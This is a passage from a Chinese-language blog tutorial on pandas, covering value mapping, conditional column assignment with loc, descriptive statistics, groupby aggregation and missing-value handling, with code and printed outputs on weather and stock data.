class="built_in">print</span>(stocks.head(), <span class="string">&#x27;\n&#x27;</span>, stocks[<span class="string">&#x27;公司&#x27;</span>].unique())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">           日期    公司      收盘      开盘       高       低    交易量   涨跌幅</span><br><span class="line"><span class="number">0</span>  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">03</span>  BIDU  <span class="number">104</span>.<span class="number">32</span>  <span class="number">102</span>.<span class="number">35</span>  <span class="number">104</span>.<span class="number">73</span>  <span class="number">101</span>.<span class="number">15</span>   <span class="number">2</span>.<span class="number">24</span>  <span class="number">0</span>.<span class="number">02</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">02</span>  BIDU  <span class="number">102</span>.<span class="number">62</span>  <span class="number">100</span>.<span class="number">85</span>  <span class="number">103</span>.<span class="number">24</span>   <span class="number">99</span>.<span class="number">50</span>   <span class="number">2</span>.<span class="number">69</span>  <span class="number">0</span>.<span class="number">01</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">01</span>  BIDU  <span class="number">102</span>.<span class="number">00</span>  <span class="number">102</span>.<span class="number">80</span>  <span class="number">103</span>.<span class="number">26</span>  <span class="number">101</span>.<span class="number">00</span>   <span class="number">1</span>.<span class="number">78</span> -<span class="number">0</span>.<span class="number">01</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">03</span>  BABA  <span class="number">169</span>.<span class="number">48</span>  <span class="number">166</span>.<span class="number">65</span>  <span class="number">170</span>.<span class="number">18</span>  <span class="number">165</span>.<span class="number">00</span>  <span class="number">10</span>.<span class="number">39</span>  <span class="number">0</span>.<span class="number">02</span></span><br><span class="line"><span class="number">4</span>  <span class="number">2019</span>-<span class="number">10</span>-<span class="number">02</span>  BABA  <span class="number">165</span>.<span class="number">77</span>  <span class="number">162</span>.<span class="number">82</span>  <span class="number">166</span>.<span class="number">88</span>  <span class="number">161</span>.<span class="number">90</span>  <span class="number">11</span>.<span class="number">60</span>  <span class="number">0</span>.<span class="number">00</span></span><br><span class="line"> [&#x27;BIDU&#x27; &#x27;BABA&#x27; &#x27;IQ&#x27; &#x27;JD&#x27;]</span><br></pre></td></tr></table></figure><p>现将 公司 这一列通过字典对应到该公司的中文名</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dict_company_names = &#123;</span><br><span class="line">    <span class="string">&quot;bidu&quot;</span>: <span class="string">&quot;百度&quot;</span>,</span><br><span class="line">    <span class="string">&quot;baba&quot;</span>: <span class="string">&quot;阿里巴巴&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iq&quot;</span>: <span class="string">&quot;爱奇艺&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jd&quot;</span>: <span class="string">&quot;京东&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stocks[<span class="string">&#x27;公司中文&#x27;</span>] = stocks[<span class="string">&#x27;公司&#x27;</span>].<span class="built_in">str</span>.lower().<span class="built_in">map</span>(dict_company_names)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(stocks[<span class="string">&#x27;公司中文&#x27;</span>].unique())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;百度&#x27; &#x27;阿里巴巴&#x27; &#x27;爱奇艺&#x27; &#x27;京东&#x27;]</span><br></pre></td></tr></table></figure><p>其实map也可以像apply一样传一个函数，修改Series的每个值</p><h2 id="5-条件选择分组后赋值"><a href="#5-条件选择分组后赋值" class="headerlink" title="5. 条件选择分组后赋值"></a>5. 条件选择分组后赋值</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先创建空列（这是第一种创建新列的方法）</span></span><br><span class="line">df[<span class="string">&#x27;wencha_type&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>错误示例：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df.loc[df[<span class="string">&quot;bWendu&quot;</span>]-df[<span class="string">&quot;yWendu&quot;</span>]&gt;<span class="number">10</span>][<span class="string">&quot;wencha_type&quot;</span>] = <span class="string">&quot;温差大&quot;</span></span><br><span class="line"></span><br><span class="line">df.loc[df[<span class="string">&quot;bWendu&quot;</span>]-df[<span class="string">&quot;yWendu&quot;</span>]&lt;=<span class="number">10</span>][<span class="string">&quot;wencha_type&quot;</span>] = <span class="string">&quot;温差正常&quot;</span></span><br></pre></td></tr></table></figure><p>两个[]的链式操作相当于<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.get(condition).<span class="built_in">set</span>(wen_cha)</span><br></pre></td></tr></table></figure><br>这里get得到的结果可能是view也可能是copy，存在歧义</p><p><strong>正确示范：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df.loc[df[<span class="string">&quot;bWendu&quot;</span>]-df[<span class="string">&quot;yWendu&quot;</span>]&gt;<span class="number">10</span>, <span class="string">&quot;wencha_type&quot;</span>] = <span class="string">&quot;温差大&quot;</span></span><br><span class="line"></span><br><span class="line">df.loc[df[<span class="string">&quot;bWendu&quot;</span>]-df[<span class="string">&quot;yWendu&quot;</span>]&lt;=<span class="number">10</span>, <span class="string">&quot;wencha_type&quot;</span>] = <span class="string">&quot;温差正常&quot;</span></span><br></pre></td></tr></table></figure><h1 id="五、聚合查询"><a href="#五、聚合查询" class="headerlink" title="五、聚合查询"></a>五、聚合查询</h1><h2 id="1-describe输出统计结果"><a href="#1-describe输出统计结果" class="headerlink" title="1. describe输出统计结果"></a>1. describe输出统计结果</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一下子提取所有数字列统计结果</span></span><br><span class="line">df.describe()</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">           bWendu      yWendu         aqi    aqiLevel      wencha</span><br><span class="line">count  <span class="number">365</span>.<span class="number">000000</span>  <span class="number">365</span>.<span class="number">000000</span>  <span class="number">365</span>.<span class="number">000000</span>  <span class="number">365</span>.<span class="number">000000</span>  <span class="number">365</span>.<span class="number">000000</span></span><br><span class="line">mean    <span class="number">18</span>.<span class="number">665753</span>    <span class="number">8</span>.<span class="number">358904</span>   <span class="number">82</span>.<span class="number">183562</span>    <span class="number">2</span>.<span class="number">090411</span>   <span class="number">10</span>.<span class="number">306849</span></span><br><span class="line">std     <span class="number">11</span>.<span class="number">858046</span>   <span class="number">11</span>.<span class="number">755053</span>   <span class="number">51</span>.<span class="number">936159</span>    <span class="number">1</span>.<span class="number">029798</span>    <span class="number">2</span>.<span class="number">781233</span></span><br><span class="line">min     -<span class="number">5</span>.<span class="number">000000</span>  -<span class="number">12</span>.<span class="number">000000</span>   <span class="number">21</span>.<span class="number">000000</span>    <span class="number">1</span>.<span class="number">000000</span>    <span class="number">2</span>.<span class="number">000000</span></span><br><span class="line"><span class="number">25</span>%      <span class="number">8</span>.<span class="number">000000</span>   -<span class="number">3</span>.<span class="number">000000</span>   <span class="number">46</span>.<span class="number">000000</span>    <span class="number">1</span>.<span class="number">000000</span>    <span class="number">8</span>.<span class="number">000000</span></span><br><span class="line"><span class="number">50</span>%     <span class="number">21</span>.<span class="number">000000</span>    <span class="number">8</span>.<span class="number">000000</span>   <span class="number">69</span>.<span class="number">000000</span>    <span class="number">2</span>.<span class="number">000000</span>   <span class="number">10</span>.<span class="number">000000</span></span><br><span class="line"><span class="number">75</span>%     <span class="number">29</span>.<span class="number">000000</span>   <span class="number">19</span>.<span class="number">000000</span>  <span class="number">104</span>.<span class="number">000000</span>    <span class="number">3</span>.<span class="number">000000</span>   <span class="number">12</span>.<span class="number">000000</span></span><br><span class="line">max     <span class="number">38</span>.<span class="number">000000</span>   <span class="number">27</span>.<span class="number">000000</span>  <span class="number">387</span>.<span class="number">000000</span>    <span class="number">6</span>.<span class="number">000000</span>   <span class="number">18</span>.<span class="number">000000</span></span><br></pre></td></tr></table></figure><p>describe只能得到数值列的统计结果</p><h2 id="2-非数值列统计"><a href="#2-非数值列统计" class="headerlink" title="2. 非数值列统计"></a>2. 非数值列统计</h2><h3 id="2-1-unique唯一去重"><a href="#2-1-unique唯一去重" class="headerlink" title="2.1 unique唯一去重"></a>2.1 unique唯一去重</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;tianqi&#x27;</span>].unique())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;晴~多云&#x27; &#x27;阴~多云&#x27; &#x27;多云&#x27; &#x27;阴&#x27; &#x27;多云~晴&#x27; &#x27;多云~阴&#x27; &#x27;晴&#x27; &#x27;阴~小雪&#x27; &#x27;小雪~多云&#x27; &#x27;小雨~ 阴&#x27; &#x27;小雨~雨夹雪&#x27;</span><br><span class="line"> &#x27;多云~小雨&#x27; &#x27;小雨~多云&#x27; &#x27;大雨~小雨&#x27; &#x27;小雨&#x27; &#x27;阴~小雨&#x27; &#x27;多云~雷阵雨&#x27; &#x27;雷阵雨~多云&#x27; &#x27;阴~ 雷阵雨&#x27; &#x27;雷阵雨&#x27;</span><br><span class="line"> &#x27;雷阵雨~大雨&#x27; &#x27;中雨~雷阵雨&#x27; &#x27;小雨~大雨&#x27; &#x27;暴雨~雷阵雨&#x27; &#x27;雷阵雨~中雨&#x27; &#x27;小雨~雷阵雨&#x27; &#x27;雷 阵雨~阴&#x27; &#x27;中雨~小雨&#x27;</span><br><span class="line"> &#x27;小雨~中雨&#x27; &#x27;雾~多云&#x27; &#x27;霾&#x27;]</span><br></pre></td></tr></table></figure><h3 id="2-2-value-counts按值计数"><a href="#2-2-value-counts按值计数" class="headerlink" title="2.2 value_counts按值计数"></a>2.2 value_counts按值计数</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df[<span class="string">&#x27;wencha_type&#x27;</span>].value_counts())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">温差正常    <span class="number">187</span></span><br><span class="line">温差大     <span class="number">178</span></span><br><span class="line"><span class="function">Name: <span class="title">wencha_type</span>, <span class="title">dtype</span>: <span class="title">int64</span></span></span><br></pre></td></tr></table></figure><h2 id="3-协方差和相关系数"><a href="#3-协方差和相关系数" class="headerlink" title="3. 协方差和相关系数"></a>3. 协方差和相关系数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(df.cov(), <span class="string">&#x27;\n\n&#x27;</span>, df.corr())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">              bWendu      yWendu          aqi   aqiLevel     wencha</span><br><span class="line">bWendu    <span class="number">140</span>.<span class="number">613247</span>  <span class="number">135</span>.<span class="number">529633</span>    <span class="number">47</span>.<span class="number">462622</span>   <span class="number">0</span>.<span class="number">879204</span>   <span class="number">5</span>.<span class="number">083614</span></span><br><span class="line">yWendu    <span class="number">135</span>.<span class="number">529633</span>  <span class="number">138</span>.<span class="number">181274</span>    <span class="number">16</span>.<span class="number">186685</span>   <span class="number">0</span>.<span class="number">264165</span>  -<span class="number">2</span>.<span class="number">651641</span></span><br><span class="line">aqi        <span class="number">47</span>.<span class="number">462622</span>   <span class="number">16</span>.<span class="number">186685</span>  <span class="number">2697</span>.<span class="number">364564</span>  <span class="number">50</span>.<span class="number">749842</span>  <span class="number">31</span>.<span class="number">275937</span></span><br><span class="line">aqiLevel    <span class="number">0</span>.<span class="number">879204</span>    <span class="number">0</span>.<span class="number">264165</span>    <span class="number">50</span>.<span class="number">749842</span>   <span class="number">1</span>.<span class="number">060485</span>   <span class="number">0</span>.<span class="number">615038</span></span><br><span class="line">wencha      <span class="number">5</span>.<span class="number">083614</span>   -<span class="number">2</span>.<span class="number">651641</span>    <span class="number">31</span>.<span class="number">275937</span>   <span class="number">0</span>.<span class="number">615038</span>   <span class="number">7</span>.<span class="number">735255</span></span><br><span class="line"></span><br><span class="line">             bWendu    yWendu       aqi  aqiLevel    wencha</span><br><span class="line">bWendu    <span class="number">1</span>.<span class="number">000000</span>  <span class="number">0</span>.<span class="number">972292</span>  <span class="number">0</span>.<span class="number">077067</span>  <span class="number">0</span>.<span class="number">071999</span>  <span class="number">0</span>.<span class="number">154142</span></span><br><span class="line">yWendu    <span class="number">0</span>.<span class="number">972292</span>  <span class="number">1</span>.<span class="number">000000</span>  <span class="number">0</span>.<span class="number">026513</span>  <span class="number">0</span>.<span class="number">021822</span> -<span class="number">0</span>.<span class="number">081106</span></span><br><span class="line">aqi       <span class="number">0</span>.<span class="number">077067</span>  <span class="number">0</span>.<span class="number">026513</span>  <span class="number">1</span>.<span class="number">000000</span>  <span class="number">0</span>.<span class="number">948883</span>  <span class="number">0</span>.<span class="number">216523</span></span><br><span class="line">aqiLevel  <span class="number">0</span>.<span class="number">071999</span>  <span class="number">0</span>.<span class="number">021822</span>  <span class="number">0</span>.<span class="number">948883</span>  <span class="number">1</span>.<span class="number">000000</span>  <span class="number">0</span>.<span class="number">214740</span></span><br><span class="line">wencha    <span class="number">0</span>.<span class="number">154142</span> -<span class="number">0</span>.<span class="number">081106</span>  <span class="number">0</span>.<span class="number">216523</span>  <span class="number">0</span>.<span class="number">214740</span>  <span class="number">1</span>.<span class="number">000000</span></span><br></pre></td></tr></table></figure><h2 id="4-分组后聚合查询"><a href="#4-分组后聚合查询" class="headerlink" title="4. 分组后聚合查询"></a>4. 分组后聚合查询</h2><h3 id="4-1-pd-groupby"><a href="#4-1-pd-groupby" class="headerlink" title="4.1 pd.groupby"></a>4.1 pd.groupby</h3><p><strong>DataFrame.groupby(by, axis=0, as_index=True, sort=True, group_keys=True,  dropna=True)</strong></p><ul><li>by: 字符串或者List&lt;字符串&gt;，用于指定分组</li><li>axis：默认为0，对行做分组</li><li>as_index：将分组的keys作为索引值，默认为True</li><li>sort：将结果按分组的keys排序，默认为True</li><li>group_keys：与as_index相同，但是只有在使用apply时生效，在使用聚合时失效（都为True）</li></ul><p>DataFrame.groupby的返回值是一个DataFrameGroupBy对象</p><h3 id="4-2-聚合查询示例"><a href="#4-2-聚合查询示例" class="headerlink" title="4.2 聚合查询示例"></a>4.2 聚合查询示例</h3><p><strong>1) 使用已有的聚合函数</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>: [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>],</span><br><span class="line">                   <span class="string">&#x27;B&#x27;</span>: [<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;three&#x27;</span>],</span><br><span class="line">                   <span class="string">&#x27;C&#x27;</span>: np.random.randn(<span class="number">8</span>),</span><br><span class="line">                   <span class="string">&#x27;D&#x27;</span>: np.random.randn(<span class="number">8</span>)&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     A      B         C         D</span><br><span class="line"><span class="number">0</span>  foo    one  <span class="number">0</span>.<span class="number">411257</span> -<span class="number">1</span>.<span class="number">345015</span></span><br><span class="line"><span class="number">1</span>  bar    one  <span class="number">0</span>.<span class="number">680037</span>  <span class="number">0</span>.<span class="number">225904</span></span><br><span class="line"><span class="number">2</span>  foo    two -<span class="number">0</span>.<span class="number">640561</span> -<span class="number">0</span>.<span class="number">447943</span></span><br><span class="line"><span class="number">3</span>  bar  three -<span class="number">0</span>.<span class="number">354500</span> -<span class="number">0</span>.<span class="number">517335</span></span><br><span class="line"><span class="number">4</span>  foo    two  <span class="number">1</span>.<span class="number">092376</span> -<span class="number">0</span>.<span class="number">978323</span></span><br></pre></td></tr></table></figure><p>agg列表传参，对不同列使用相同聚合函数：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_group1 = df.groupby([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]).agg([np.<span class="built_in">sum</span>, np.mean])</span><br></pre></td></tr></table></figure><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                  C                   D</span><br><span class="line">                sum      mean       sum      mean</span><br><span class="line">A   B</span><br><span class="line">bar one    <span class="number">0</span>.<span class="number">680037</span>  <span class="number">0</span>.<span class="number">680037</span>  <span class="number">0</span>.<span class="number">225904</span>  <span class="number">0</span>.<span class="number">225904</span></span><br><span class="line">    three -<span class="number">0</span>.<span class="number">354500</span> -<span class="number">0</span>.<span class="number">354500</span> -<span class="number">0</span>.<span class="number">517335</span> -<span class="number">0</span>.<span class="number">517335</span></span><br><span class="line">    two   -<span class="number">1</span>.<span class="number">047294</span> -<span class="number">1</span>.<span class="number">047294</span> -<span class="number">1</span>.<span class="number">879435</span> -<span class="number">1</span>.<span class="number">879435</span></span><br><span class="line">foo one    <span class="number">0</span>.<span class="number">419079</span>  <span class="number">0</span>.<span class="number">209540</span> -<span class="number">1</span>.<span class="number">893515</span> -<span class="number">0</span>.<span class="number">946758</span></span><br><span class="line">    three -<span class="number">0</span>.<span class="number">681836</span> -<span class="number">0</span>.<span class="number">681836</span>  <span class="number">1</span>.<span class="number">008956</span>  <span class="number">1</span>.<span class="number">008956</span></span><br><span class="line">    two    <span class="number">0</span>.<span class="number">451816</span>  <span class="number">0</span>.<span class="number">225908</span> -<span class="number">1</span>.<span class="number">426266</span> -<span class="number">0</span>.<span class="number">713133</span></span><br></pre></td></tr></table></figure><br>agg对象传参，对不同列使用不同聚合函数：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_group2 = df.groupby([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]).agg(&#123;<span class="string">&#x27;C&#x27;</span>: np.<span class="built_in">sum</span>, <span class="string">&#x27;D&#x27;</span>: np.mean&#125;)</span><br></pre></td></tr></table></figure><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                   C         D</span><br><span class="line">A   B</span><br><span class="line">bar one    <span class="number">0</span>.<span class="number">680037</span>  <span class="number">0</span>.<span class="number">225904</span></span><br><span class="line">    three -<span class="number">0</span>.<span class="number">354500</span> -<span class="number">0</span>.<span class="number">517335</span></span><br><span class="line">    two   -<span class="number">1</span>.<span class="number">047294</span> -<span class="number">1</span>.<span class="number">879435</span></span><br><span class="line">foo one    <span class="number">0</span>.<span class="number">419079</span> -<span class="number">0</span>.<span class="number">946758</span></span><br><span class="line">    three -<span class="number">0</span>.<span class="number">681836</span>  <span class="number">1</span>.<span class="number">008956</span></span><br><span class="line">    two    <span class="number">0</span>.<span class="number">451816</span> -<span class="number">0</span>.<span class="number">713133</span></span><br></pre></td></tr></table></figure></p><p>DataFrameGroupBy对象原生的函数：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_group3 = df.groupby(<span class="string">&#x27;A&#x27;</span>)[<span class="string">&#x27;C&#x27;</span>].mean()</span><br></pre></td></tr></table></figure><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A</span><br><span class="line">bar   -<span class="number">0</span>.<span class="number">240586</span></span><br><span class="line">foo    <span class="number">0</span>.<span class="number">037812</span></span><br><span class="line"><span class="function">Name: <span class="title">C</span>, <span class="title">dtype</span>: <span class="title">float64</span></span></span><br></pre></td></tr></table></figure></p><p><strong>2）自定义聚合函数</strong></p><p>DataFrameGroupBy.apply(func,  <em>args,  \</em>*kwargs)</p><ul><li>func：自定义的聚合函数，第一个参数是一个DataFrame</li><li><em>args, \</em>*kwargs：func第二个及往后的参数（如有）</li></ul><p>使用的数据为多次出现在例子中的天气数据，增加一列为月份，由ymd年月日得到：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新增一列为月份</span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;ymd&#x27;</span>].<span class="built_in">str</span>[:<span class="number">7</span>]</span><br></pre></td></tr></table></figure><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">          ymd  bWendu  yWendu tianqi  ... aqi aqiInfo  aqiLevel    month</span><br><span class="line"><span class="number">0</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">01</span>       <span class="number">3</span>      -<span class="number">6</span>   晴~多云  ...  <span class="number">59</span>       良         <span class="number">2</span>  <span class="number">2018</span>-<span class="number">01</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">02</span>       <span class="number">2</span>      -<span class="number">5</span>   阴~多云  ...  <span class="number">49</span>       优         <span class="number">1</span>  <span class="number">2018</span>-<span class="number">01</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">03</span>       <span class="number">2</span>      -<span class="number">5</span>     多云  ...  <span class="number">28</span>       优         <span class="number">1</span>  <span class="number">2018</span>-<span class="number">01</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">04</span>       <span class="number">0</span>      -<span class="number">8</span>      阴  ...  <span class="number">28</span>       优         <span class="number">1</span>  <span class="number">2018</span>-<span class="number">01</span></span><br><span class="line"><span class="number">4</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">05</span>       <span class="number">3</span>      -<span class="number">6</span>   多云~晴  ...  <span class="number">50</span>       优         <span class="number">1</span>  <span class="number">2018</span>-<span class="number">01</span></span><br></pre></td></tr></table></figure></p><p>对月份做分组，并对分组后的数据对最高温度做排序，返回最高温度最大的3行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getTopN</span>(<span class="params">df, n</span>):</span><br><span class="line">    <span class="keyword">return</span> df.sort_values(by=<span class="string">&#x27;bWendu&#x27;</span>)[[<span class="string">&#x27;ymd&#x27;</span>, <span class="string">&#x27;bWendu&#x27;</span>, <span class="string">&#x27;yWendu&#x27;</span>]][-n:]</span><br><span class="line"></span><br><span class="line">df_group = df.groupby(<span class="string">&#x27;month&#x27;</span>).apply(getTopN, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                   ymd  bWendu  yWendu</span><br><span class="line">month</span><br><span class="line"><span class="number">2018</span>-<span class="number">01</span> <span class="number">16</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">17</span>       <span class="number">6</span>      -<span class="number">7</span></span><br><span class="line">        <span class="number">13</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">14</span>       <span class="number">6</span>      -<span class="number">5</span></span><br><span class="line">        <span class="number">18</span>  <span class="number">2018</span>-<span class="number">01</span>-<span class="number">19</span>       <span class="number">7</span>      -<span class="number">4</span></span><br><span class="line"><span class="number">2018</span>-<span class="number">02</span> <span class="number">58</span>  <span class="number">2018</span>-<span class="number">02</span>-<span class="number">28</span>       <span class="number">9</span>      -<span class="number">2</span></span><br><span class="line">        <span class="number">53</span>  <span class="number">2018</span>-<span class="number">02</span>-<span class="number">23</span>      <span class="number">10</span>      -<span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="六、缺失值处理"><a href="#六、缺失值处理" class="headerlink" title="六、缺失值处理"></a>六、缺失值处理</h1><h2 id="1-处理方式"><a href="#1-处理方式" class="headerlink" title="1. 处理方式"></a>1. 处理方式</h2><p>Pandas使用这些函数处理缺失值：</p><ul><li>isnull和notnull：检测是否是空值，可用于df和series</li><li>dropna：丢弃、删除缺失值<ul><li>axis : 删除行还是列，{0 or ‘index’, 1 or ‘columns’}, default 0</li><li>how : 如果等于any则任何值为空都删除，如果等于all则所有值都为空才删除</li><li>inplace : 如果为True则修改当前df，否则返回新的df</li></ul></li><li>fillna：填充空值<ul><li>value：用于填充的值，可以是单个值，或者字典（key是列名，value是值）</li><li>method : 等于ffill使用前一个不为空的值填充forword fill；等于bfill使用后一个不为空的值填充backword fill</li><li>axis : 按行还是列填充，{0 or ‘index’, 1 or ‘columns’}</li><li>inplace : 如果为True则修改当前df，否则返回新的df</li></ul></li></ul><h2 id="2-数据清洗示例"><a href="#2-数据清洗示例" class="headerlink" title="2. 数据清洗示例"></a>2. 数据清洗示例</h2><p><img src="/img/2024/04/pandas/excel.png" alt="image.png"></p><h3 id="2-1-检测空值"><a href="#2-1-检测空值" class="headerlink" title="2.1 检测空值"></a>2.1 检测空值</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 跳过前面两空行</span></span><br><span class="line">studf = pd.read_excel(<span class="string">&quot;../datas/student_excel/student_excel.xlsx&quot;</span>, skiprows=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测空值</span></span><br><span class="line"><span class="built_in">print</span>(studf.isnull())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">    Unnamed: 0     姓名     科目     分数</span></span><br><span class="line"><span class="function">0         <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">1         <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">2         <span class="title">True</span>   <span class="title">True</span>  <span class="title">False</span>  <span class="title">False</span></span></span><br><span class="line"><span class="function">3         <span class="title">True</span>   <span class="title">True</span>   <span class="title">True</span>   <span class="title">True</span></span></span><br><span 